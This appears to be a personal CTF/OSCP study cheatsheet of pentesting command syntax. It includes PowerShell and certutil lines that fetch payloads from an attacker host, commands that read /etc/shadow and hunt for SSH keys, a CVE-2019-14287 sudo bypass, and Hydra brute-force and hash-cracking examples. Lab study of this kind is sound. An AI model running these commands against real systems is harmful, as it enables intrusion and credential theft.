---
title: CTF Cheatsheet
description: A handy cheatsheet for CTF so I won't have to lose my mind finding correct syntax.
author: Bsar
date: 2024-10-13
categories: [Cheatsheet]
tags: [Cheatsheet]
pin: true
math: true
mermaid: true
---


## Checklist

- [ ]  Nmap/Rustscan
- [ ]  /etc/hosts (if applicable)
- [ ]  Directory Busting
- [ ]  Virtual Host/Subdomain busting
- [ ]  API (if applicable)
- [ ]  Source Code
- [ ]  Login page
- [ ]  Intercept Web Response


## Change directory in windows meterpreter

```bash
meterpreter > cd c:\\Windows\\temp
```
Write two \\

## Window Exploit Suggester Next Gen: 
[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)


## Web pentesting

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web)

Default pages with interesting info:

```
/robots.txt
/sitemap.xml
/crossdomain.xml
/clientaccesspolicy.xml
/.well-known/
Check also comments in the main and secondary pages.
```

## DNS recon

```bash
dnsenum --dnsserver <IP_DNS> --enum -p 0 -s 0 -o subdomains.txt -f subdomains-1000.txt <DOMAIN>
dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS>
dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan
```

## Upgrade shell - easy to read shell

`python -c 'import pty;pty.spawn("/bin/bash")';`

`python3 -c 'import pty;pty.spawn("/bin/bash")';`

## Use arrow keys to go back and forth on shell

```bash
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
echo $TERM
```

note that shell will be lag and we can also `CTRL+L` to clear terminal

## clear terminal

Linux: `CTRL+L` or `clear`

Window: `cls`

## OSCP Style cat flag, ip and date in oneliner

`cd /root && cat root.txt && cd /home/bill && cat user.txt && ifconfig && date'`

## Window OSCP flags

```bash
cd /users/bob/desktop && type user.txt && cd /users/administrator/desktop && type root.txt && ipconfig && date /t
```

## find perm (SUID)

`find / -user root -perm /4000 2> /dev/null` look  for SUID

`find / -perm -u=s -type f 2>/dev/null`

`find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;`

## find shared object

`find / -type  f -perm -04000 -ls 2>/dev/null`


## find capabilities

`getcap -r / 2>/dev/null`


## find exec (this show us whether we can execute a certain binary)

`find / -user root -perm -4000 -exec ls -ldb {} \;`

## find NFS

`cat /etc/export`


## find crontab

`cat /etc/crontab`

## check privilege

`sudo -l`

## find SSH key

```bash
find / -name authorized_keys 2> /dev/null
#or
find / -name id_rsa 2> /dev/null
```

## find thing (file)

`find / -type d -name` to locate directory

`find / -type f -name reverseshell`

`whereis docker`   #find the path of things

## find files (windows)

`dir /b/s *root.txt*`

## find a `.exe` (windows)

```bash
where /R c:\windows
where /R c:\
#example
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
```

# Alternate Data Stream  (windows)


```bash
dir /R
more < file.txt:root.txt:$DATA
```

## Lateral Movement

`cat * | grep -i passw*`

`cat /etc/passwd`

`cat /etc/shadow`

## close a port

```bash
sudo netstat -tuln | grep :[port]   #skip this if we know the port
sudo lsof -i :[port]
sudo kill [PID that the port is running]  
sudo kill -9 [PID] #to force kill                                                                                                                                                             
```

## kill a vpn

```bash
┌──(kali㉿kali)-[~/]
└─$ ps aux | grep openvpn
root       39616  0.1  0.1  13716  9856 ?        S    17:00   0:09 openvpn VPN.ovpn
root      155370  0.0  0.0  19436  7272 pts/2    S+   18:41   0:00 sudo openvpn VPN.ovpn
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/]
└─$ sudo kill 39616 
```

## Create a simply vertical list by number

`for i in {0..999}; do echo $i; done > range.txt`

## Filter rockyou.txt to just 10 charatacter

`cat /home/kali/WL/rockyou.txt | pw-inspector -m 10 -M 10 > /home/kali/WL/10.txt`

`cat /home/kali/Documents/rockyou.txt | awk -b 'length($0)<11' > /home/kali/Documents/6only.txt`

## Remove `--checkpoint`

`rm /path/to/--checkpoint-action=exec=sh\getroot.sh`

## Binary expoitation

[https://lolbas-project.github.io/#](https://lolbas-project.github.io/#)   #for window similar to GTFObin

[https://gtfobins.github.io/](https://gtfobins.github.io/)              #for linux

## LS
```Bash
ls -la #list all file
```
## chmod

Example `chmod 777 #file` to give `rwx rwx rwx` permission

Which command can we use to achieve the permissions of `rwx --x --x`?

`chmod 711 file`

## Check systemctl

`systemctl list-units --type=service --state=running`

## evil-winrm

`evil-winrm -i {IP} -u {Username} -H {hash}`

## Upload a payload on Powershell

```bash
powershell -c "$client = New-Object System.Net.WebClient; $client.DownloadFile('http://10.10.10.10:8000/test.txt', 'C:\Windows\Temp\test.txt')"
```

## scp (download file)

Copy something from another system to this system: 

`scp username@remotehost.edu:foobar.txt /home/kali`

Copy something from this system to some other system:

`scp /path/to/local/file username@hostname:/path/to/remote/file`

Copy something from some system to some other system:

`scp username1@hostname1:/path/to/file username2@hostname2:/path/to/other/file`

### scp from EC2

`scp -i key_file.pem username@remotehost.edu:/remote/dir/foobar.txt /local/dir`

## ssh syntax

`ssh username@10.**.**.**`

### ssh to older machine

`ssh -oHostKeyAlgorithms=+ssh-dss user@10.10.10.10`

`-oHostKeyAlgorithms=` is the whatever key allowed to access (use nmap to scan)

### ssh with rsa key

`ssh2john #rsa/key/path > rsa`

`john #path/to/RSA`
`ssh -i ~/.ssh/custom_key_name SYSUSER@IP_ADDRESS_OF_SERVER`

## ftp
When entering passive mode, type: `passive` helps speed ftp response
Type `binary` to download without interuption


### ftp python server

```bash
#install pyftpdlib if it's not found and "externally managed"
python3 -m pip install pyftpdlib --break-system-packages
python -m pyftpdlib -p 21 --write
```

## Hydra - brute force directory

`hydra -L list_user -P list_password -V #Target_IP http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"`

## Below is a mini hydra cheatsheet:

| **Command** | **Description** |
| --- | --- |
| hydra -P <wordlist> -v <ip> <protocol> | Brute force against a protocol of your choice |
| hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol> | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) |
| hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip> | Attack a Windows Remote Desktop with a password list. |
| hydra -l <username> -P .<password list> $ip -V http-form-post 
'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra to brute force. |

## Use John

`john #path/to/pass`

## Use hashid

`hashid -m {hash}`

## Use hashcat

`hashcat -m 0 hash.txt -a 0 /home/kali/Documents/rockyou.txt`

## wget

`wget http://10.10.10.10:8000/file` On Linux

`wget http://10.10.10.10:8000/file file` On Window, we need to name the output file

## **CVE-2019-14287**

[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

`sudo -u#-1 /bin/bash`

## Rustscan

syntax:

`rustscan -a http://10.10.10.10 — -A`

## Feroxbuster

`feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

`-s` status code, show only a particular code (`100,200,300`)

### Filter bad response code

`feroxbuster -u http://sea.htb -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 401 404 400 501 503 505 403 -o /home/kali/#path`

`-u` url

`-k` disables SSL certificate verification.

`-w` wordlist

`-C` filter status code out

`-o` output

## FFUF

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.10/FUZZ -ic`

`-ic` - ignore comments like #this is a comment

## Certutil (download file on window shell)

`certutil.exe -urlcache -f http://10.10.10.10:8000/winpeas.exe winpeas.exe`

## Fcrackzip  (crack zip password)

`fcrackzip -v -u -D -p /home/kali/WL/rockyou.txt save.zip`

## Nikto

`nikto -h http://10.10.10.10`

## Nano

`ctrl+k`     #delete the whole line

## Unzip rockyou.txt.gz

`cd /usr/share/wordlists/`

`sudo gzip -d rockyou.txt.gz` 

or one liner

`cd /usr/share/wordlists/ && sudo gzip -d rockyou.txt.gz`


## etc/hosts

### Windows

`C:\Windows\System32\drivers\etc`

### Linux

`sudo nano etc/hosts`

## Strip Blank Space

`| tr -d " \t\n\r”`

`cat SQLService.hash | tr -d " \t\n\r"`


## Decode Base64 on linux/windows 11 terminal

#have python installed

`python -m base64 -d backup_credentials.txt`


## HackTools (Extension)

[https://addons.mozilla.org/en-US/firefox/addon/hacktools/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search](https://addons.mozilla.org/en-US/firefox/addon/hacktools/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search)

## PayloadsAllTheThings

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Old Kali

[https://old.kali.org/virtual-images/](https://old.kali.org/virtual-images/)

## Coding Cheatsheet
[https://devhints.io/python](https://devhints.io/python)